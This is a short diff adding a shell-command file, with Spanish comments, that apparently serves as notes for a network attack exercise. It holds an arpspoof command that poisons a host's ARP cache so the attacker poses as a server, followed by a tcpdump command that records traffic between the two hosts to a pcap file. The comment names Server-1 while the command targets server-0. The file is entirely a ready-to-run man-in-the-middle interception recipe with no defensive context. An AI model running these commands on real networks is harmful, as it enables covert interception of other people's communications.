@@ -1,0 +1,6 @@
+# arp poisonning
+# Engaña a Agent-1 diciéndole que eres Server-1
+sudo arpspoof -i wlan0 -t agent-1 server-0
+
+# tcpdump
+sudo tcpdump -i <INTERFAZ> host server-0 and agent-1 -w captura.pcap
